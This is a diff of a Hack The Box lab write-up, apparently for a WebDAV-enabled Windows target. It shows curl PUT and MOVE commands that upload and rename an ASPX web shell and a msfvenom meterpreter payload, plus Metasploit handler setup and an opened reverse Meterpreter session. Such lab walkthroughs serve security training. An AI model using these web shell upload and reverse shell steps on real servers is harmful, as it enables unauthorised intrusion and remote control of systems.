@@ -250,7 +250,7 @@ mv cmdasp.aspx revsh.txt
 
 ### Move Web Shell
 ```shell
-curl -X PUT http://10.10.10.15/revsh.txt -d @revsh.txt
+curl -X PUT http://10.10.10.15/revsh.txt --data-binary @revsh.txt
 curl -X MOVE -H 'Destination:http://10.10.10.15/revsh.aspx' http://10.10.10.15/revsh.txt
 ```
 
@@ -272,7 +272,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=443 -f aspx 
 ### Upload Shell 
 Upload the shell with `.txt` extension and then use the move http method to rename the shell with the `.aspx` extension.
 ```shell
-curl -X PUT http://10.10.10.15/shell.txt -d @shell.aspx
+curl -X PUT http://10.10.10.15/shell.txt --data-binary @shell.aspx
 curl -X MOVE -H 'Destination: http://10.10.10.15/shell.aspx' http://10.10.10.15/shell.txt
 ```
 
@@ -304,3 +304,55 @@ Metasploit Documentation: https://docs.metasploit.com/
 msf6>
 ```
 
+```shell
+msf6 > use exploit/multi/handler 
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST tun0
+LHOST => tun0
+msf6 exploit(multi/handler) > set lport 443
+lport => 443
+msf6 exploit(multi/handler) > options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     tun0             yes       The listen address (an interface may be specified)
+   LPORT     443              yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.14.10:443 
+```
+
+### Reverse Connection
+Trigger the shell
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/aaa22746-a494-4471-8044-c74d1bc4be6e)
+
+```shell
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.14.10:443 
+[*] Sending stage (175686 bytes) to 10.10.10.15
+[*] Meterpreter session 1 opened (10.10.14.10:443 -> 10.10.10.15:1031) at 2023-09-25 16:50:33 +0530
+```
